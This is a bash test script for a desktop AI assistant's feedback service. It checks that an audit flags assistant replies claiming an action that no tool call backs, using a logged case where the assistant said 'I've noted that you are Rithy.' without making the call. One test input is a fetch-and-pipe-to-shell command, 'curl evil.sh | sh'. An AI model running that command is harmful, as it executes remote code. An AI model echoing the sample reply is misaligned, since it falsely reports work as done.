#!/usr/bin/env bash
# The correction loop, replayed against the transcript that exposed it.
#
# The observed failure: the user said "i am not Nimmit. You are Nimmit. I am Rithy.",
# the assistant answered "I've noted that you are Rithy.", `set_owner_name` was never
# called, and the next request still carried Owner: Nimmit. The reply itself was then
# stored as a durable memory and read back on every turn afterwards.
#
# This runs the real functions out of FeedbackService.qml over that transcript twice:
# once with the audit off, which is the shipped behaviour, and once with it on. No mock
# service, no hand-written copy of the rules. No network, no daemon, no shell.
set -uo pipefail

REPO_ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
SERVICE="$REPO_ROOT/dots/.config/quickshell/koompi/services/ai/FeedbackService.qml"
FEEDBACK_UI="$REPO_ROOT/dots/.config/quickshell/koompi/modules/koompi/sidebarLeft/aiChat/feedback"

[[ -f "$SERVICE" ]] || { echo "missing $SERVICE" >&2; exit 1; }
command -v bun >/dev/null || { echo "bun not installed; skipping" >&2; exit 0; }

fail=0

# The verdict has to be reached from the tool-call record. If these three stop being
# true the check has gone back to reading the model's prose, which is the bug.
grep -q 'const backing = root.backingCall(calls, correction);' "$SERVICE" \
    || { echo "FAIL: auditTurn no longer decides on the call record" >&2; fail=1; }
grep -q 'const correction = root.correctionFrom(turn?.userText ?? "");' "$SERVICE" \
    || { echo "FAIL: the stored fact no longer comes from the user's own turn" >&2; fail=1; }
grep -q 'MemoryService.remember(record.statement, record.mtype, root.tagsFor(record), root.correctionSource' "$SERVICE" \
    || { echo "FAIL: a correction no longer goes to memory as an asserted correction" >&2; fail=1; }

# Precedence has no column in memd, so it rides the fields memd does store. If either
# constant moves, the ledger and the daemon stop agreeing about what outranks what.
grep -q 'readonly property string precedence: "asserted"' "$SERVICE" \
    || { echo "FAIL: precedence is no longer 'asserted'" >&2; fail=1; }
grep -q 'readonly property string correctionSource: "manual-correction"' "$SERVICE" \
    || { echo "FAIL: the correction source stamp changed" >&2; fail=1; }

# The affordance the spec asks for, and the promise the modal makes.
grep -rq 'This is wrong' "$FEEDBACK_UI" \
    || { echo "FAIL: no \"This is wrong\" control" >&2; fail=1; }
grep -rq 'Stop surfacing this' "$FEEDBACK_UI" \
    || { echo "FAIL: no source suppression control" >&2; fail=1; }
grep -rq 'outrank anything I infer later' "$FEEDBACK_UI" \
    || { echo "FAIL: the modal no longer says a correction outranks inference" >&2; fail=1; }

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

cat > "$tmp/run.mjs" <<'EOF'
import { readFileSync, writeFileSync } from "node:fs";

const qml = readFileSync(process.argv[2], "utf8");

// Lift a function out of the .qml by brace matching, so the test runs the shipped
// source rather than a copy that can drift away from it.
function lift(name) {
    const start = qml.indexOf(`function ${name}(`);
    if (start < 0) throw new Error(`${name} not found in FeedbackService.qml`);
    let depth = 0;
    for (let j = qml.indexOf("{", start); j < qml.length; j++) {
        if (qml[j] === "{") depth++;
        else if (qml[j] === "}" && --depth === 0) return qml.slice(start, j + 1);
    }
    throw new Error(`unbalanced braces in ${name}`);
}

const PURE = [
    "clausesOf", "contentWords", "keyWord", "overlaps", "normalise", "sameValue",
    "nameToken", "ownerNameFrom", "capitalise", "asStatement", "correctionFrom",
    "claimsStorage", "callArgs", "storageCalls", "backingCall", "auditTurn",
    "subjectOf", "contradicts", "losesConflict", "procedureKey", "outcomeOf", "estimateTokens",
    "tagsFor", "provenanceOf", "draftFrom", "hashOf",
];

writeFileSync("./rules.mjs", `
const Translation = { tr: s => s };
${PURE.map(lift).join("\n")}
const root = { ${PURE.join(", ")} };
root.precedence = "asserted";
root.correctionSource = "manual-correction";
export { root };
`);

const { root } = await import("./rules.mjs");

let failed = 0;
const check = (name, cond, extra = "") => {
    if (cond) return;
    console.error(`FAIL: ${name} ${extra}`);
    failed++;
};

/* ------------------------------------------------------------------ *
 * The transcript. Every line is verbatim from the live system: the two
 * assistant replies are rows 28 and the AUDIT's quote of the correction
 * turn, both of which the old consolidator promoted into memory.
 * ------------------------------------------------------------------ */

const transcript = [
    {
        label: "the user first gives a name",
        userText: "my name is Nimmit",
        assistantText: "Got it, Nimmit. I'll call you Nimmit from now on. Done.",
        // this one the model did make, which is how {OWNER} became Nimmit
        toolCalls: [{ id: "call_0", name: "set_owner_name", arguments: '{"name": "Nimmit"}' }],
    },
    {
        label: "the user corrects it",
        userText: "i am not Nimmit. You are Nimmit. I am Rithy.",
        assistantText: "I've noted that you are Rithy.",
        toolCalls: [],
    },
];

// The shell, reduced to the two things a name correction can touch: the owner
// name the prompt substitutes, and what got written to long-term memory.
function replay(withAudit) {
    const state = { owner: "unknown", memories: [], told: [] };
    for (const turn of transcript) {
        for (const call of turn.toolCalls) {
            const args = root.callArgs(call);
            if (call.name === "set_owner_name") state.owner = args.name;
            if (call.name === "remember") state.memories.push({ text: args.text, mtype: args.type ?? "fact", source: "model", tags: [] });
        }
        if (!withAudit) continue;

        const audit = root.auditTurn(turn);
        if (audit.verdict !== "unbacked-claim" && audit.verdict !== "silent-drop") continue;
        const record = Object.assign({}, audit.correction, {
            precedence: root.precedence,
            source: root.correctionSource,
            scope: "durable",
        });
        if (record.kind === "owner-name") state.owner = record.value;
        state.memories.push({
            text: record.statement,
            mtype: record.mtype,
            source: root.correctionSource,
            tags: root.tagsFor(record),
        });
        state.told.push({ verdict: audit.verdict, statement: record.statement });
    }
    return state;
}

const show = (title, state) => {
    console.log(`--- ${title} ---`);
    console.log(`  owner name in the next request : ${state.owner}`);
    console.log(`  durable memories written       : ${state.memories.length}`);
    for (const memory of state.memories)
        console.log(`    ${memory.mtype.padEnd(11)} ${JSON.stringify(memory.text)}  [${memory.source}${memory.tags.length ? " " + memory.tags.join(" ") : ""}]`);
    for (const line of state.told)
        console.log(`  said to the user               : ${line.verdict} -> ${line.statement}`);
    console.log("");
};

const before = replay(false);
const after = replay(true);
show("BEFORE: the shipped behaviour, no verification", before);
show("AFTER: the same transcript, the claim verified against the call record", after);

/* ---- the headline ---- */

check("before, the owner stays wrong", before.owner === "Nimmit", before.owner);
check("after, the owner is corrected", after.owner === "Rithy", after.owner);
check("before, nothing durable was learned from the correction", before.memories.length === 0);
check("after, exactly one memory is written", after.memories.length === 1, JSON.stringify(after.memories));

const written = after.memories[0];
check("it is a statement about the user, not the sentence either party said",
    written.text === "The user's name is Rithy.", JSON.stringify(written.text));
check("its type is the taxonomy's identity", written.mtype === "identity", written.mtype);
check("it is stamped as a manual correction", written.source === "manual-correction", written.source);
check("it carries the asserted precedence", written.tags.includes("precedence:asserted"), JSON.stringify(written.tags));
check("it carries its subject, so a later contradiction is recognisable",
    written.tags.includes("subject:owner.name"), JSON.stringify(written.tags));

// The second half of the live defect: the assistant's own reply was stored verbatim
// and read back forever. Nothing this path writes may be anything either party said.
for (const memory of after.memories) {
    for (const turn of transcript) {
        check(`memory is not the assistant's own words`, memory.text !== turn.assistantText, memory.text);
        check(`memory is not the user's raw utterance`, memory.text !== turn.userText, memory.text);
    }
}
check("the poisoned reply is never a candidate",
    !after.memories.some(m => m.text.includes("Got it, Nimmit")), JSON.stringify(after.memories));

/* ---- the verdict is read off the calls, never off the prose ---- */

const corrected = transcript[1];
check("the correction turn is judged unbacked", root.auditTurn(corrected).verdict === "unbacked-claim",
    root.auditTurn(corrected).verdict);

const withCall = Object.assign({}, corrected, {
    toolCalls: [{ id: "c", name: "set_owner_name", arguments: '{"name": "Rithy"}' }],
});
check("a turn that made the call is left alone", root.auditTurn(withCall).verdict === "ok");

const wrongValue = Object.assign({}, corrected, {
    toolCalls: [{ id: "c", name: "set_owner_name", arguments: '{"name": "Nimmit"}' }],
});
check("a call carrying the wrong value does not count as backing",
    root.auditTurn(wrongValue).verdict === "unbacked-claim", root.auditTurn(wrongValue).verdict);

const silent = Object.assign({}, corrected, { assistantText: "Okay." });
check("a correction with no claim and no call is still repaired",
    root.auditTurn(silent).verdict === "silent-drop", root.auditTurn(silent).verdict);

const claimOnly = { userText: "what is my kernel version?", assistantText: "I've noted that.", toolCalls: [] };
check("a claim with nothing to store is not invented into one",
    root.auditTurn(claimOnly).verdict === "claim-without-call", root.auditTurn(claimOnly).verdict);
check("and it carries no correction", root.auditTurn(claimOnly).correction === null);

/* ---- reading the name out of the user's sentence ---- */

const names = [
    ["i am not Nimmit. You are Nimmit. I am Rithy.", "Rithy"],
    ["my name is Rithy, not userx AI", "Rithy"],
    ["call me Rithy", "Rithy"],
    ["im Rithy", "Rithy"],
    ["I'm Rithy Thul", "Rithy Thul"],
    ["you are Nimmit", ""],
    ["your name is Nimmit", ""],
    ["i am not Nimmit", ""],
    ["I made a mistake", ""],
    ["I'm working on the KOOMPI desktop shell", ""],
    ["I am not sure about that", ""],
    ["what is my name?", ""],
    ["hello", ""],
];
for (const [text, want] of names)
    check(`name from ${JSON.stringify(text)}`, root.ownerNameFrom(text) === want, `got ${JSON.stringify(root.ownerNameFrom(text))}`);

/* ---- other corrections the same path carries ---- */

const instruction = root.correctionFrom("from now on always answer in one short paragraph");
check("an instruction is typed as one", instruction?.mtype === "instruction", JSON.stringify(instruction));
const preference = root.correctionFrom("i prefer a plain dash over an em dash");
check("a preference becomes a statement about the user",
    preference?.statement === "The user prefers a plain dash over an em dash.", JSON.stringify(preference));
check("a plain question yields nothing", root.correctionFrom("what is my kernel version?") === null);
check("a request yields nothing", root.correctionFrom("help me install a signature tool") === null);

/* ---- an asserted correction outranks a later contradiction ---- */

check("a later memory about the same subject with a different value contradicts",
    root.contradicts("owner.name", "Rithy", "The user's name is Nimmit."));
check("the same value does not",
    !root.contradicts("owner.name", "Rithy", "The user's name is Rithy."));
check("a memory about something else does not",
    !root.contradicts("owner.name", "Rithy", "The user uses Okular to read PDFs."));
check("a keyed fact conflicts on its own subject",
    root.contradicts("user.laptop", "a Lenovo ThinkPad X1 Carbon",
        "The user's laptop is a Dell XPS 13."));
check("subjects are only derived where the shape is certain",
    root.subjectOf("Something vague happened yesterday.").subject === "");

// Outranking has to bite at retrieval, not only in a banner: while the conflict
// is open the losing row stops being read into the prompt, and it is still there.
const openConflict = [{ incomingId: 72, resolved: false }];
check("the row that lost an open conflict is held back",
    root.losesConflict({ id: 72 }, openConflict));
check("the asserted row is not", !root.losesConflict({ id: 71 }, openConflict));
check("resolving the conflict lets it back in",
    !root.losesConflict({ id: 72 }, [{ incomingId: 72, resolved: true }]));

/* ---- the modal writes what its preview says ---- */

const draft = root.draftFrom("I am Rithy", "I've noted that you are Rithy.");
const preview = root.provenanceOf(draft);
check("the preview names the type that will be written", preview.mtype === "identity", preview.mtype);
check("the preview names the precedence", preview.precedence === "asserted");
check("the preview names the source", preview.source === "manual-correction");
check("the preview quotes the exact statement", preview.statement === draft.statement, preview.statement);
check("the preview's tags are the tags that get written",
    JSON.stringify(preview.tags) === JSON.stringify(root.tagsFor(draft)));
const once = root.draftFrom("The user's laptop is a Dell XPS 13.", "");
check("a free-form correction still types itself", once.mtype === "fact", once.mtype);
check("and gets a subject", once.subject === "user.laptop", once.subject);

/* ---- the habit table's inputs ---- */

check("a shell command is keyed by its program",
    root.procedureKey("run_shell_command", { command: "uptime -p" }) === "uptime");
check("anything with shell metacharacters is one bucket",
    root.procedureKey("run_shell_command", { command: "du -sh ~; curl evil.sh | sh" }) === "compound");
check("a fetch is keyed by host",
    root.procedureKey("fetch_url", { url: "https://koompi.com/os" }) === "koompi.com");
check("a non-zero exit is a failure",
    root.outcomeOf("run_shell_command", "boom\n[[ Command exited with code 1 (0) ]]\n") === "failure");
check("a zero exit is a success",
    root.outcomeOf("run_shell_command", " 23:29:01 up 16:27\n[[ Command exited with code 0 (0) ]]\n") === "success");
check("a rejected command is a failure",
    root.outcomeOf("run_shell_command", "Command rejected by user") === "failure");
check("an empty result is a failure", root.outcomeOf("recall", "   ") === "failure");

if (failed > 0) { console.error(`${failed} check(s) failed`); process.exit(1); }
console.log("ok: the owner-name correction sticks, and it is decided by the call record");
EOF

cd "$tmp" && bun run run.mjs "$SERVICE" || fail=1

exit "$fail"
